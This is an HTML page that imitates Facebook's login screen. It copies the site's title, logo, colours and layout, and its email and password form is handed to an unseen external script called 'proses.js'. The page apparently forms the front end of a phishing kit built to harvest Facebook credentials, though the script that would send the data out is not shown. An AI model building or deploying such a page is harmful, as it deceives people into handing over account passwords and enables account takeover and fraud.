<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { width: 100%; max-width: 396px; text-align: center; padding: 20px; }
        .fb-logo { width: 160px; margin-bottom: 20px; }
        .login-box { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); }
        input { width: 100%; padding: 14px 16px; margin: 6px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; outline: none; }
        .btn-login { width: 100%; background-color: #1877f2; color: #fff; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; padding: 10px; cursor: pointer; margin-top: 10px; }
        .divider { border-bottom: 1px solid #dadde1; margin: 20px 0; }
        .btn-new { background-color: #42b72a; color: #fff; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; padding: 12px 16px; cursor: pointer; text-decoration: none; }
    </style>
</head>
<body>

<div class="login-container">
    <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4l_v2btLpXY.svg" alt="Facebook" class="fb-logo">
    <div class="login-box">
        <form id="fbForm">
            <input type="text" id="email" placeholder="Email address or phone number" required>
            <input type="password" id="pass" placeholder="Password" required>
            <button type="submit" class="btn-login" id="btnLog">Log In</button>
        </form>
        <div class="divider"></div>
        <button type="button" class="btn-new">Create new account</button>
    </div>
</div>

<script src="proses.js"></script>

</body>
</html>
